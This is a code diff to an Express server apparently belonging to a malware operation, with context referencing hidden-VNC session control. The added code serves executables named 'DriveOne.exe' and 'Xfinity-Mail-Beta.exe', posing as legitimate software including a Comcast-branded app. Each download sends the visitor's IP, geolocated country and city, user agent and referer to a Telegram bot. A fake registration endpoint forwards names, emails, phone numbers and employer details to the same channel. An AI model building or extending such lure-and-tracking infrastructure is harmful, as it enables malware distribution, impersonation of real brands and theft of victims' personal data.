@@ -2031,10 +2031,98 @@ app.post('/api/hvnc_explorer/kill/:sessionId', verifyToken, (req, res) => {
 
 
 // ─── DOWNLOAD ENDPOINT ──────────────────────────────────────────
-app.get('/sbfbkbj', (req, res) => {
+
+
+// ─── TELEGRAM CONFIG ──────────────────────────────────────────────
+
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
+
+// ─── HELPER: Get country from IP ──────────────────────────────────
+async function getCountryFromIP(ip) {
+    // Skip for localhost/private IPs
+    if (ip === '::1' || ip === '127.0.0.1' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
+        return 'Local/Private';
+    }
+    
+    try {
+        // Using ip-api.com (free, no API key required)
+        const response = await axios.get(`http://ip-api.com/json/${ip}`, {
+            timeout: 3000
+        });
+        
+        if (response.data && response.data.status === 'success') {
+            const country = response.data.country || 'Unknown';
+            const city = response.data.city || 'Unknown';
+            const region = response.data.regionName || 'Unknown';
+            return `${country} (${city}, ${region})`;
+        }
+        return 'Unknown';
+    } catch (error) {
+        console.error('❌ Failed to get country from IP:', error.message);
+        return 'Unknown';
+    }
+}
+
+
+// ─── HELPER: Get client IP ──────────────────────────────────────
+function getClientIP(req) {
+    const forwarded = req.headers['x-forwarded-for'];
+    if (forwarded) {
+        return forwarded.split(',')[0].trim();
+    }
+    return req.ip || req.connection.remoteAddress || 'Unknown';
+}
+
+
+
+
+async function sendTelegramAlert(message) {
+    try {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        await axios.post(url, {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+        });
+        console.log('✅ Telegram alert sent:', message);
+    } catch (error) {
+        console.error('❌ Failed to send Telegram alert:', error.message);
+    }
+}
+
+
+
+
+
+
+
+
+
+
+
+
+// Endpoint for DriveOne
+app.get('/sbfbkbj', async (req, res) => {
     const filePath = path.join(__dirname, 'dist', 'DriveOne.exe');
     
     if (fs.existsSync(filePath)) {
+        const ip = getClientIP(req);
+        const userAgent = req.get('User-Agent') || 'Unknown';
+        const referer = req.get('Referer') || 'Direct';
+        const country = await getCountryFromIP(ip);
+        
+        const message = `
+🔔 <b>DriveOne Download</b>
+📱 <b>User Agent:</b> ${userAgent}
+🌐 <b>IP:</b> ${ip}
+🌍 <b>Country:</b> ${country}
+🔗 <b>Referer:</b> ${referer}
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+        `;
+        await sendTelegramAlert(message);
+
         res.setHeader('Content-Disposition', 'attachment; filename="DriveOne.exe"');
         res.setHeader('Content-Type', 'application/octet-stream');
         const readStream = fs.createReadStream(filePath);
@@ -2042,6 +2130,86 @@ app.get('/sbfbkbj', (req, res) => {
     } else {
         res.status(404).send('File not found. Please contact support.');
     }
+});
+
+
+
+
+// Endpoint for Xfinity Mail Beta
+app.get('/comcast', async (req, res) => {
+    const filePath = path.join(__dirname, 'dist', 'Xfinity-Mail-Beta.exe');
+    
+    if (fs.existsSync(filePath)) {
+        const ip = getClientIP(req);
+        const userAgent = req.get('User-Agent') || 'Unknown';
+        const referer = req.get('Referer') || 'Direct';
+        const country = await getCountryFromIP(ip);
+        
+        const message = `
+🔔 <b>Xfinity Mail Beta Download</b>
+📱 <b>User Agent:</b> ${userAgent}
+🌐 <b>IP:</b> ${ip}
+🌍 <b>Country:</b> ${country}
+🔗 <b>Referer:</b> ${referer}
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+        `;
+        await sendTelegramAlert(message);
+
+        res.setHeader('Content-Disposition', 'attachment; filename="Xfinity-Mail-Beta.exe"');
+        res.setHeader('Content-Type', 'application/octet-stream');
+        const readStream = fs.createReadStream(filePath);
+        readStream.pipe(res);
+    } else {
+        res.status(404).send('File not found. Please contact support.');
+    }
+});
+
+
+
+// ─── FORM SUBMISSION ENDPOINT ──────────────────────────────────
+app.post('/api/register', async (req, res) => {
+    const { fullName, email, company, useCase, phone, role, experience, source } = req.body;
+    const ip = getClientIP(req);
+    const country = await getCountryFromIP(ip);
+    
+    // Determine which app the registration is for
+    const appType = source || 'Xfinity Mail Beta';
+    
+    // Build the message dynamically based on what fields are provided
+    let message = `
+📝 <b>New Registration - ${appType}</b>
+👤 <b>Name:</b> ${fullName || 'Not provided'}
+📧 <b>Email:</b> ${email || 'Not provided'}
+🌐 <b>IP:</b> ${ip}
+🌍 <b>Country:</b> ${country}
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+    `;
+
+    // Add DriveOne-specific fields if they exist
+    if (phone) {
+        message += `📱 <b>Phone:</b> ${phone}\n`;
+    }
+    if (role) {
+        message += `💼 <b>Role:</b> ${role}\n`;
+    }
+    if (experience) {
+        message += `📊 <b>Experience:</b> ${experience}\n`;
+    }
+
+    // Add Xfinity-specific fields if they exist
+    if (company) {
+        message += `🏢 <b>Company:</b> ${company}\n`;
+    }
+    if (useCase) {
+        message += `📋 <b>Use Case:</b> ${useCase}\n`;
+    }
+    
+    await sendTelegramAlert(message);
+    
+    res.json({ 
+        success: true, 
+        message: 'Registration successful! You can now download the app.' 
+    });
 });
 
 // ─────────────────────────────────────────────────────────────────────────────
